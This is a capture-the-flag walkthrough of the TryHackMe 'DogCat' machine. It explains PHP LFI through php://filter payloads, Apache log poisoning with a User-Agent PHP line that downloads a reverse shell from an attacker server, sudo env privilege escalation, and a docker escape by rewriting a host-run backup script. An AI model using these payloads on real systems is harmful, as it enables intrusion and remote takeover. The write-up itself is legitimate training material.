![[dogcat_00.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_00.png)

This machine is a little harder but, That's OK that means we'll be learning something new and getting smarter.

We will start, as usual, with some `nmap` scans. 

![[dogcat_01.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_01.png)

The scan returns two ports that are open `ssh` and `http`. Let's check out the web-server.

We can see a simple website to display images of `doggos` and `cattos`. 

![[dogcat_02.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_02.png)

There are a few things we know about the machine from the get go, which we can glean from the tagline of this room:

>I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.

It's a site made with PHP and it's hosted in docker container.

When we click around the site for a second we can see that there exists a clear vector for `LFI` through the `view` parameter when we select whether we want a picture of a dog or cat.

![[dogcat_03.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_03.png)

We can check the `hacktricks` archive on `LFI` to see what types of things we can look for with such a vulnerability. If this endpoint is vulnerable to `LFI`, that means we can potentially read and write to the underlying system.

Checking `hacktricks` we can see that it lists 25 parameters that are potentially vulnerable. It looks like our `view` parameter is there.

![[dogcat_04.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_04.png)

Now, we just want to know how we can access files directly. It would be nice to see if we can read any PHP that is included on these pages. But, `PHP` will always be parsed before the page is displayed, leaving us with only the results.

Performing a `gobuster` scan on the page won't net us anything very interesting except a page called `flag.php`. If we go to `flag.php`, it'll be blank. Meaning if there is some PHP on the page, it's already parsed before being given to us.

![[dogcat_05.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_05.png)

This is where PHP filters can come in handy. Because with filters we can grab resources, encode them and then decode them on our end. Meaning, we can potentially read any `.php` file on the site if we know it's name.

Let's try to access `index.php` first. We'll use the `base64` filter for `php` like so:

`?view=php://filter/convert.base64encode/resource=index.php`

![[dogcat_06.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_06.png)

When we select either link we get `?view=dog` or `?view=cat`. That means we might have to try some directory traversal to see if we can get to `index.php`.

From our `gobuster` scan we can see two directories from the main directory.

![[dogcat_07.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_07.png)

So we could potentially do: `dog/../index.php` to get to it.

![[dogcat_08.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_08.png)

Interesting. We have a warning and we can see that the `include` statement is having trouble grabbing the file. `include` is a vulnerable function which means we can now be 100% sure that we have a `LFI` vulnerability (I mean, we knew that going onto the machine but, it's good to know how to check). All we have to do now is to specify the right file.

We can see that it's having trouble with `index.php.php` meaning the code must be appending `.php` to the filename somewhere.

OK, we'll just use `index` then

`?view=php://filter/convert.base64-encode/resource=index`

![[dogcat_09.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_09.png)

Bingo!

This is a little hard to read so let's run `burpsuite`, intercept a call to `?view=`  , send it to `repeater` and try our payload.

![[dogcat_10.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_10.png)

Once we've copied the data we can decode it from `base64` in a bunch of ways. We'll use `CyberChef` for that and copy the output to `sublime text`. It'd be just as easy to do it on the command line and redirect the output to a new file.

![[dogcat_11.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_11.png)

Now we're getting somewhere. We can see that there are two `params` that the site is checking: `ext` and `view`. The `view` parameter MUST contain `dog` or `cat` and if `ext` isn't specified it'll append `.php` (we just saw this). That means if we add `ext=` to our payload we should be able to grab ANY file.

Let's try to grab `/etc/passwd` to confirm this.

![[dogcat_12.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_12.png)

Gold.

Note, if we're not looking at `php` files we don't need to use filters as we're not trying to prevent the server from parsing any `php` code. 

Let's check `flag.php` now.

![[dogcat_13.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_13.png)

Nice!

So, we can read files but what about getting a shell? 

Playing around with it for a while (also some prior knowledge or research helps) will reveal that  `Apache2` is running on the server and logs of connections made are placed in a file called `access.log` in `/var/log/apache2`.

That means if we can read that, we might be able to get it to execute some code. Remember that this server is processing all `PHP` when a file contains it. Therefore, if we can add some `PHP` to the log file (which we should be able to do by sending a request with `PHP` in the `User-Agent`) we should be able to spawn a shell. This is called `log poisoning`. 

Let's check the log to see if it'll log a custom `User-Agent`. It should but, let's make sure.

![[dogcat_14.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_14.png)

Yes it does!

Now all we want is a `php-reverse-shell` and to get it onto the system through the log.

We can use `PHP` to set file contents with `file_put_contents()` and we can grab file contents with `file_get_contents()`. The latter will allow us to even grab contents from a server. That means, with a `curl` request we can grab the contents of a file and place it in a new file on the server.

We could do this two ways.

```php
data = file_get_contents('<webserver with php rev shell>');
file_put_contents('shell.php', $data);

// OR
file_put_contents('shell.php', file_get_contents('<webserver>'));
```

The second is easier and cleaner. We just have to put it in the `User-Agent`.

First, we'll grab the `php-reverse-shell` from `pentestmonkey` and set it up correctly to use our `IP` and a `PORT` we specify. Then serve it up on a web-server using the Python `http.server` module.

![[dogcat_15.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_15.png)

Now setup the request

![[dogcat_16.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_16.png)

Lastly, access the file that should be available now. It will be set to the site's base directory.

![[dogcat_17.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_17.png)

![[dogcat_18.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_18.png)

**Note**: Make sure your syntax is correct first otherwise you can corrupt the log and you'll get stuck and have to reset the machine... ask me how I know.

Now we need to enumerate, enumerate and enumerate. 

Looking around the system we'll find the second flag in `/var/www`

![[dogcat_19.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_19.png)

We are still only the `www-data` user at this point. Even though we are in a container we do have a `root` user and we should look into escalating to that user.

The tried and true method of `sudo -l` reveals something interesting.

![[dogcat_20.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_20.png)

We can use `/usr/bin/env`? That's very useful to us as by using `env` we can spawn a shell to escalate to root. You can confirm that on `GTFObins` if you want.

![[dogcat_21.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_21.png)

After we perform the escalation method, we'll find the third flag.

![[dogcat_22.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_22.png)

Nice! 

The last thing to do, I presume, is to break out of the container and find a flag on the host system. There are many ways to do it and we can check the `hacktricks` docker escape tips but we'll find that none of them are useful here. However, if we look around the system we'll find a directory with a script inside: `/opt/backups`.

This file is backing up the container to a `tar` file.

![[dogcat_23.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_23.png)

The script simply performs a backup of a file system. But, it's the directories it backs up which are important to us.

It looks like it's backing up the container itself, using the host to perform the backup.

We can't find any `cronjobs` here doing this regularly. If we use `pspy64` we can see something happening every `30` seconds or so.

![[dogcat_24.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_24.png)

It looks like `root` is running something using `sh` to `curl` the localhost. Well, that doesn't seem useful. Discovery is hard!

As mentioned above it's possible that the `backup.sh` script is being run from the host in a similar way? But how can we check?

A really basic way is to just list the file or directory to see if the file gets updated. Here the `.tar` file would be the one getting updated.

![[dogcat_25.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_25.png)

Yup, it looks like the file is getting updated approximately every minute. That means if we manipulate `backup.sh` (where the backup occurs) we could get ourselves a shell, right?

A good thing to remember here however is that the `backup.sh` file is going to be run as a script so instead of just placing a reverse shell inside the `backup.sh` file we will have to specify a hash-bang (`#!/bin/bash`) at the start of the file for it to execute properly. The hash-bang tells the terminal that the script should be run with bash. 

First, we'll create a script.

![[dogcat_26.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_26.png)

Second, we'll serve it up using Python's `http.server` module and grab it with `curl`. Also, we'll make sure to have a listener ready to grab the shell.

![[dogcat_27.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_27.png)

![[dogcat_28.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_28.png)

Now we'll wait for a minute...

![[dogcat_29.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_29.png)

Win!

The last thing we need to do is grab the last flag.

![[dogcat_30.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_30.png)

And we're done.

We can confirm that the script was being run from a  `cronjob` on the host machine with `ps auxf`

![[dogcat_31.png]](https://raw.githubusercontent.com/ToasterMouse/WriteupsAndCTFs/main/TryHackMe/DogCat/images/dogcat_31.png)

This was a great machine and I learned a lot by doing it. Patience being the key thing :P
